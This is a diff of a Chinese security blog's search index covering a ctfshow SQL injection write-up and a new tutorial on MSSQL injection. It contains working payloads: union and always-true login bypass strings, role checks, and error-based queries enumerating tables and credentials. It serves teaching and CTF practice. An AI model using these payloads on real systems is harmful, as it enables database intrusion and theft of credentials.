@@ -8201,89 +8201,48 @@
     <url>/2024/12/03/web%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5%E7%AF%87-ctfshow/</url>
     <content><![CDATA[<h1 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h1><p>借鉴文章:<a href="https://fushuling.com/index.php/2023/04/07/sql%e6%b3%a8%e5%85%a5%e4%b8%80%e5%91%bd%e9%80%9a%e5%85%b3/">https://fushuling.com/index.php/2023/04/07/sql%e6%b3%a8%e5%85%a5%e4%b8%80%e5%91%bd%e9%80%9a%e5%85%b3/</a></p>
 <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p><strong>SQL注入：</strong>是发生于应用程序和数据库层的安全漏洞，简而言之，是在输入的字符串之中<strong>注入sql指令</strong>，在设计不良的程序当中<strong>忽略了字符检查</strong>，那么这些注入进去的恶意指令就会被数据库服务器<strong>误认为是正常的sql指令而运行</strong>，因此遭到破坏或是入侵。这种漏洞可能<strong>导致数据泄露、数据篡改、身份冒充和其他严重的安全问题</strong>。</p>
-<p>sql里有四大最常见的操作，即<strong>增删查改</strong>：</p>
-<ul>
-<li>增。增加数据。其简单结构为: <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</li>
-<li>删。删除数据。其简单结构为: <code>DELETE table_name WHERE condition</code>。</li>
-<li>查。查找数据。其简单结构为：<code>SELECT columns_name FROM table_name WHERE condition</code>。</li>
-<li>改。有修改&#x2F;更新数据。简单结构为:<code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</li>
-</ul>
 <h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><p>我们正常的sql查询语句是</p>
 <p>字符型</p>
-<p>select * from &lt;表名&gt; where id &#x3D;’$_GET[id]‘;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &lt;表名&gt; where id =’$_GET[id]‘;</span><br></pre></td></tr></table></figure>
+
 <p>数字型</p>
-<p>select * from &lt;表名&gt; where id &#x3D;$_GET[id];</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &lt;表名&gt; where id =$_GET[id];</span><br></pre></td></tr></table></figure>
+
 <h3 id="1-判断是否存在SQL注入"><a href="#1-判断是否存在SQL注入" class="headerlink" title="1.判断是否存在SQL注入"></a>1.判断是否存在SQL注入</h3><p>单引号判断法，即在参数后面加上单引号（无论字符型还是整型都会因为单引号个数不匹配而报错）</p>
 <h3 id="2-判断注入方式"><a href="#2-判断注入方式" class="headerlink" title="2.判断注入方式"></a><strong>2.判断注入方式</strong></h3><p><strong>数字型判断：</strong></p>
 <p>用最经典的and 1&#x3D;1和and 1&#x3D;2进行判断</p>
 <p>假设某个注入的注入类型是数字型，那么</p>
-<p>?id&#x3D;1 and 1&#x3D;1页面运行正常</p>
-<p>?id&#x3D;1 and 1&#x3D;2页面运行错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and 1=1页面运行正常</span><br><span class="line"></span><br><span class="line">?id=1 and 1=2页面运行错误</span><br></pre></td></tr></table></figure>
+
 <p>为什么呢?</p>
 <p>在a and b运算中，当使用 <code>AND</code> 运算符时，只有当所有条件都为真时，整个条件才被视为真。</p>
 <p>解释：当输入 and 1&#x3D;1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; x and 1&#x3D;1，语法正确且逻辑判断为正确，所以返回正常。</p>
 <p>当输入 and 1&#x3D;2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; x and 1&#x3D;2，语法正确但逻辑判断为假，所以返回错误。</p>
 <p>假设这里是字符型判断的话，我们输入的语句就会有以下的执行情况：</p>
 <p>当输入1 and 1&#x3D;1，1 and 1&#x3D;2时，后台执行 Sql 语句：</p>
-<p>select * from &lt;表名&gt; where id &#x3D; ‘x and 1&#x3D;1’</p>
-<p>select * from &lt;表名&gt; where id &#x3D; ‘x and 1&#x3D;2’</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &lt;表名&gt; where id = ‘x and 1=1’</span><br><span class="line"></span><br><span class="line">select * from &lt;表名&gt; where id = ‘x and 1=2’</span><br></pre></td></tr></table></figure>
+
 <p>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p>
 <p><strong>字符型判断：</strong></p>
 <p>也是用最经典的 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断</p>
 <p>假设某个注入的注入类型是字符型</p>
-<p>?id&#x3D;1’ and ‘1’ &#x3D; ‘1,页面运行正常</p>
-<p>?id&#x3D;1’ and ‘1’ &#x3D; ‘2,页面运行错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1’ and ‘1’ = &#x27;1,页面运行正常</span><br><span class="line"></span><br><span class="line">?id=1’ and ‘1’ = &#x27;2,页面运行错误</span><br></pre></td></tr></table></figure>
+
 <p>解释：当输入 and ‘1’&#x3D;’1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; ‘x’ and ‘1’&#x3D;’1’语法正确，逻辑判断正确，所以返回正确。</p>
 <p>当输入 and ‘1’&#x3D;’2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; ‘x’ and ‘1’&#x3D;’2’语法正确，但逻辑判断错误，所以返回异常。</p>
+<h3 id="3-判断字段数"><a href="#3-判断字段数" class="headerlink" title="3.判断字段数"></a>3.判断字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by x#</span><br></pre></td></tr></table></figure>
+
 <h2 id="1-常规注入"><a href="#1-常规注入" class="headerlink" title="1.常规注入"></a>1.常规注入</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>联合注入即union注入，其作用就是，在原来查询条件的基础上，通过系统关键字<code>union</code>从而拼接上我们自己的<code>select</code>语句，然后把后面<code>select</code>得到的结果将拼接到前面<code>select</code>的结果后边。如：前个<code>select</code>得到2条数据，后个<code>select</code>也得到2条数据，那么后个<code>select</code>的数据将拼接到第一个<code>select</code>返回的内容中。</p>
 <p>联合注入有它的利用条件，UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条 SELECT 语句中的列的顺序必须相同，也就是说只能：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure>
 
 <p>这也是为什么我们在联合注入之前往往需要先利用 <code>order/group by n</code> 判断字段的数量。</p>
 <h4 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h4><p>假如对于url&#x2F;?id&#x3D;1，且后端代码用单引号包裹参数，我们的注入步骤为（其实即sqllib第一关，buuoj有在线环境）</p>
-<h5 id="MySQL-5-0"><a href="#MySQL-5-0" class="headerlink" title="MySQL &gt;&#x3D; 5.0"></a>MySQL &gt;&#x3D; 5.0</h5><p><strong>1) 确定字段的数量</strong></p>
-<p><strong>order by 简单的来说 就是对前面查询的数据进行分组，分组依据是前面查询的内容的属性。因为使用union函数进行查询时，union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样，所以我们必需要知道前面语句查询了多少个元素。</strong></p>
-<p>通过从1开始改变n的大小，如果网页出现报错则证明n大于真实，因为order by n是对第n个字段进行排序的意思，如果n的值大于真实的字段数量自然就会报错了。至于最后的–+是注释符的意思，为了注释掉原有的sql语句执行我们自己的，也可以用%23即#代替：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by n --+</span><br></pre></td></tr></table></figure>
-
-<p>或者我们可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; group by n --+</span><br></pre></td></tr></table></figure>
-
-<p>group是对数据进行分组，也可以起到相同的效果。</p>
-<p><strong>2) 判断回显位</strong></p>
-<p><strong>因为要将显示位判断出来，我们才能知道应该在哪里注入我们查询的语句它才会显示</strong></p>
-<p>有时候页面里只有一个回显位，所以我们需要用-1保证前面的查询查不出数据以确保后面的联合查询能正常查询，假如我们确定了一共有三个字段，我们可以使用：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p>通过数字是几判断回显位</p>
-<p><strong>3) 获取系统数据库名</strong></p>
-<p>group_concat()的作用是把回显放到一行里，便于观察</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
-
-<p><strong>4) 获取当前数据库名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
-
-<p><strong>5) 获取数据库中的表</strong></p>
-<p>获取当前数据的所有表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
-
-<p>即获取security数据库下的所有表名</p>
-<p><strong>6) 获取表里的列名(即字段名)</strong></p>
-<p>获得users表下的所有字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
-
-<p><strong>7) 获取数据</strong></p>
-<p>如果我们想获得users表下username以及password的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username , password) from users --+</span><br></pre></td></tr></table></figure>
-
-<p>简单的说，<strong>查库名-&gt;查表名-&gt;查字段名-&gt;查数据</strong></p>
+<h5 id="MySQL-5-0"><a href="#MySQL-5-0" class="headerlink" title="MySQL &gt;&#x3D; 5.0"></a>MySQL &gt;&#x3D; 5.0</h5><p>MYSQL&gt;&#x3D;5.0就是我们常用的sql注入，具体的联合注入方法就是在web171</p>
 <h5 id="MySQL-5-0-1"><a href="#MySQL-5-0-1" class="headerlink" title="MySQL &lt; 5.0"></a>MySQL &lt; 5.0</h5><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工爆破了，一般用于盲注，不过现在市面中基本上很多的数据库都是5.0以上的版本，暂时还没遇到过5.0以下的。</p>
 <p>说到联合注入我就想到联合注入的一个技巧，就是插入临时表，顺便再来谈谈sql万能密码</p>
-<h4 id="sql万能密码"><a href="#sql万能密码" class="headerlink" title="sql万能密码"></a>sql万能密码</h4><h5 id="永真语句"><a href="#永真语句" class="headerlink" title="永真语句"></a>永真语句</h5><p>‘ or 1&#x3D;1 </p>
-<p>‘ or ‘or’&#x3D;’or’</p>
+<h4 id="sql万能密码"><a href="#sql万能密码" class="headerlink" title="sql万能密码"></a>sql万能密码</h4><h5 id="永真语句"><a href="#永真语句" class="headerlink" title="永真语句"></a>永真语句</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 </span><br><span class="line"></span><br><span class="line">&#x27; or &#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure>
+
 <p>通过一个永真判断登录，其中，1&#x3D;1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。这导致无论用户名是什么，只要密码是万能密码，用户都能通过验证。</p>
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>分号<code>;</code>为MYSQL语句的结束符，若在支持多语句执行的情况下，可利用此方法执行其他恶意语句。比如有函数mysqli_multi_query()，它支持执行一个或多个针对数据库的查询，查询语句使用分号隔开。如果正常的语句是：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1;</span><br></pre></td></tr></table></figure>
@@ -8611,7 +8570,8 @@
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241206172001781.png" alt="image-20241206172001781"></p>
 <p>导入我们刚刚下载的fuzzing中的payload</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241206172054640.png" alt="image-20241206172054640"></p>
-<p>目录下的xplatform.txt，然后就可以进行爆破了</p>
+<p>目录下的xplatform.txt，然后就可以进行爆破了，然后可以根据response包去判断哪些字符是被过滤了哪些字符能用</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241206173227672.png" alt="image-20241206173227672"></p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
@@ -9528,6 +9488,239 @@
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>深入浅出sql注入</title>
+    <url>/2024/12/06/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="0x01sql注入前置"><a href="#0x01sql注入前置" class="headerlink" title="0x01sql注入前置"></a>0x01sql注入前置</h1><p>讲这个知识之前我们得先问自己三个问题</p>
+<h2 id="什么是数据库？"><a href="#什么是数据库？" class="headerlink" title="什么是数据库？"></a>什么是数据库？</h2><p>简单来说，数据库就是“数据”的“仓库”。数据库是一个组织化的数据集合，用于存储、管理和检索信息。它为存储数据提供了一种格式化的方式，并允许用户和应用程序有效地查询、更新和管理这些数据。数据库中包含表、关系以及操作对象，数据存储在表中。</p>
+<h2 id="什么是sql？"><a href="#什么是sql？" class="headerlink" title="什么是sql？"></a>什么是sql？</h2><p>SQL是结构化查询语言，是一种用于与关系数据库进行交互的标准编程语言。它用于定义、操作和控制数据，以及管理数据库。SQL 是一种高度通用的语言，几乎所有的数据库管理系统（RDBMS）都支持SQL，包括MySQL、PostgreSQL、Microsoft SQL Server 和 Oracle 等。</p>
+<p>sql里有四大最常见的操作，即<strong>增删查改</strong>：</p>
+<ul>
+<li>增。增加数据。其简单结构为: <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</li>
+<li>删。删除数据。其简单结构为: <code>DELETE table_name WHERE condition</code>。</li>
+<li>查。查找数据。其简单结构为：<code>SELECT columns_name FROM table_name WHERE condition</code>。</li>
+<li>改。有修改&#x2F;更新数据。简单结构为:<code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</li>
+</ul>
+<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p><strong>SQL注入：</strong>是发生于应用程序和数据库层的安全漏洞，简而言之，是在输入的字符串之中<strong>注入sql指令</strong>，在设计不良的程序当中<strong>忽略了字符检查</strong>，那么这些注入进去的恶意指令就会被数据库服务器<strong>误认为是正常的sql指令而运行</strong>，因此遭到破坏或是入侵。这种漏洞可能<strong>导致数据泄露、数据篡改、身份冒充和其他严重的安全问题</strong>。</p>
+<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><h2 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h2><p>什么是mssql？</p>
+<p>MSSQL，或称为Microsoft SQL Server，mssql是Microsoft System Structured Query Language 的缩写，是指微软操作系统的数据库语言，是由微软开发的一种数据库关系管理系统（RDBMS）。</p>
+<h3 id="MSSQL基础使用"><a href="#MSSQL基础使用" class="headerlink" title="MSSQL基础使用"></a>MSSQL基础使用</h3><p>讲到mssql数据库，我们首先要了解到里面的自带库</p>
+<p>默认自带库的类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。</span><br><span class="line">model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</span><br><span class="line">msdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</span><br><span class="line">tempdb   //它为临时表和其他临时工作提供了一个存储区。</span><br></pre></td></tr></table></figure>
+
+<p>其中最常用的就是master库了</p>
+<h4 id="master库"><a href="#master库" class="headerlink" title="master库"></a>master库</h4><p>master数据库是系统数据库，这里存储了所有数据库名和存储过程，就好比mysql里面的information_schema元数据库，这个存储过程其实就好比是一个函数调用的过程</p>
+<p>储存过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。(不是注入的重点，主要是后面getshell需要用，所以简单了解一下就可以了，下面还会带到)</p>
+<p>这里贴一张关于master库的展示图</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/1.1.1.png" alt="1.1.1"></p>
+<p>在master数据库中有<code>master.dbo.sysdatabases</code>视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有<code>syscolumns</code>存储着所有的字段，可编程性储存着我们的函数。</p>
+<p>查询数据库语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases;</span><br><span class="line">#在 SQL Server 中，查询master.dbo.sysdatabases视图可以用于获取实例数据库中所有数据库的名称。</span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line">test</span><br><span class="line">asp_net</span><br><span class="line">asp_test</span><br></pre></td></tr></table></figure>
+
+<p>关于字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select top 1 name,xtype from sysobjects;</span><br><span class="line">#这是一个 SELECT 查询语句，它从 sysobjects 表中选择顶部 1 条记录，并仅检索 name 和 xtype 列的值。</span><br></pre></td></tr></table></figure>
+
+<p>但是这里的xtype是可控的，可以是下面这些类型的一种</p>
+<ul>
+<li>C &#x3D; CHECK 约束</li>
+<li>D &#x3D; 默认值或 DEFAULT 约束</li>
+<li>F &#x3D; FOREIGN KEY 约束</li>
+<li>L &#x3D; 日志</li>
+<li>FN &#x3D; 标量函数</li>
+<li>IF &#x3D; 内嵌表函数</li>
+<li>P &#x3D; 存储过程</li>
+<li>PK &#x3D; PRIMARY KEY 约束（类型是 K）</li>
+<li>RF &#x3D; 复制筛选存储过程</li>
+<li>S &#x3D; 系统表</li>
+<li>TF &#x3D; 表函数</li>
+<li>TR &#x3D; 触发器</li>
+<li>U &#x3D; 用户表</li>
+<li>UQ &#x3D; UNIQUE 约束（类型是 K）</li>
+<li>V &#x3D; 视图</li>
+<li>X &#x3D; 扩展存储过程</li>
+</ul>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>我们先了解一下服务器级别和数据库级别的角色的区别</p>
+<ol>
+<li>服务器级别角色：<ul>
+<li>服务器级别角色是定义在整个 SQL Server 实例上的一组固定角色。</li>
+<li>这些角色控制着整个服务器的权限和功能，如安全设置、备份操作、服务器级别配置等。</li>
+</ul>
+</li>
+<li>数据库级别角色：<ul>
+<li>数据库级别角色是定义在特定数据库中的一组角色。</li>
+<li>这些角色控制着数据库中对象的访问权限，如表、视图、存储过程等。</li>
+<li>数据库级别角色与服务器级别角色的作用范围不同，主要关注数据库内部的权限控制。</li>
+</ul>
+</li>
+</ol>
+<h4 id="服务器级别"><a href="#服务器级别" class="headerlink" title="服务器级别"></a>服务器级别</h4><p><img src="/./../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20241206194113814-1733485276606-10.png" alt="image-20241206194113814"></p>
+<p>我们可以用<code>IS_SRVROLEMEMBER</code>来判断服务器级别的固定角色</p>
+<p><code>IS_SRVROLEMEMBER</code> 是一个系统函数，用于检查指定登录名是否属于指定的服务器级别的固定角色。我们可以利用这个函数的role的有效值去判断服务器级别的固定角色</p>
+<table>
+<thead>
+<tr>
+<th>返回值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>login 不是 role 的成员。</td>
+</tr>
+<tr>
+<td>1</td>
+<td>login 是 role 的成员。</td>
+</tr>
+<tr>
+<td>NULL</td>
+<td>role 或 login 无效，或者没有查看角色成员身份的权限。</td>
+</tr>
+</tbody></table>
+<p>然后我们构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;serveradmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;setupadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;securityadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;diskadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;bulkadmin&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><code>is_srvrolemember</code> 函数需要传入两个参数，即固定角色名和登录名。</p>
+<p>在 SQLMap 中使用 –is-dba 命令可以判断是否为管理员权限，即服务器级别的固定角色</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)))</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据库级别"><a href="#数据库级别" class="headerlink" title="数据库级别"></a>数据库级别</h4><p><img src="/./../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20241206194907105-1733485750110-12.png" alt="image-20241206194907105"></p>
+<p>数据库级别的应用角色用<code>IS_ROLEMEMBER</code>函数判断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_owner&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_securityadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_accessadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_backupoperator&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_ddladmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_datawriter&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_datareader&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_denydatawriter&#x27;))--</span><br></pre></td></tr></table></figure>
+
+<p>讲完了这个我们再来了解一下基本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT @@version; //版本</span><br><span class="line">SELECT user;		//用户</span><br><span class="line">SELECT DB_NAME();	//当前数据库名，你可以用db_name(n)来遍历出所有的数据库</span><br><span class="line">SELECT @@servername;	//主机名</span><br></pre></td></tr></table></figure>
+
+<p>那么站库分离可以这么来判断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id=&#x27;1&#x27; and host_name()=@@servername;--&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>站库分离的话实际上就是站点和数据库各司其职，二者互相独立，提高系统性能和可维护性</p>
+<h3 id="常见符号"><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h3><p>1.注释符号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**/</span><br><span class="line">--</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
+
+<p>双斜杠是用来注释单行代码的，而&#x2F;**&#x2F;是用于注释多行代码的</p>
+<p>2.空白字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格字符（%20）</span><br><span class="line">制表符\t</span><br><span class="line">换行符\n</span><br><span class="line">回车符\r</span><br></pre></td></tr></table></figure>
+
+<p>3.运算符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;位与逻辑运算符，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为1时，结果中的位才被设置为1，否则，结果中的位被设置为0</span><br><span class="line">|位或逻辑运算符，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为1时，结果的位就被设置为1，只有当两个位的值都为0时，结果中的位才被设置为0</span><br><span class="line">^位异或逻辑运算符，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为1时，结果中的位就被设置为1；只有当两个位的值都为0或1时，结果中的位才被设置为0</span><br><span class="line"></span><br><span class="line">ALL 如果一组的比较都为true，则比较结果为true</span><br><span class="line">AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false</span><br><span class="line">ANY 如果一组的比较中任何一个为true，则结果为true</span><br><span class="line">BETWEEN 如果操作数在某个范围之内，那么结果为true</span><br><span class="line">EXISTS  如果子查询中包含了一些行，那么结果为true</span><br><span class="line">IN  如果操作数等于表达式列表中的一个，那么结果为true</span><br><span class="line">LIKE    如果操作数与某种模式相匹配，那么结果为true</span><br><span class="line">NOT 对任何其他布尔运算符的结果值取反</span><br><span class="line">OR  如果两个布尔表达式中的任何一个为true，那么结果为true</span><br><span class="line">SOME    如果在一组比较中，有些比较为true，那么结果为true</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本注入流程"><a href="#基本注入流程" class="headerlink" title="基本注入流程"></a>基本注入流程</h3><p>爆破当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and DB_NAME()&gt;1;</span><br><span class="line">?id=1&#x27;and db_name()&gt;0;--</span><br></pre></td></tr></table></figure>
+
+<p>为什么这个可以爆出来呢</p>
+<p>这里利用mssql数据类型不一样的报错情况，在将 nvarchar 值 ‘FanmvCMS’ 转换成数据类型 int 时失败。从而把数据库爆出来</p>
+<p>爆破表名</p>
+<p>在将 nvarchar 值 ‘Fanmv_Admin’ 转换成数据类型 int 时失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 name from sysobjects WHERE xtype=&#x27;u&#x27;);</span><br><span class="line">查询表的完整步骤</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;);--</span><br><span class="line">//旨在返回数据库中第一个用户表的名称。</span><br><span class="line">//然后通过不断调整查询条件的name not in(&#x27;table_name&#x27;)，逐步排除已知表名去拿到我们想找的表名</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;));--</span><br><span class="line">(&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;, &#x27;fsb_messages&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;, &#x27;fsb_messages&#x27;, &#x27;fsb_transactions&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;, &#x27;fsb_messages&#x27;, &#x27;fsb_transactions&#x27;, &#x27;fsb_users&#x27;));-</span><br></pre></td></tr></table></figure>
+
+<p>爆破字段名</p>
+<p>在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。</p>
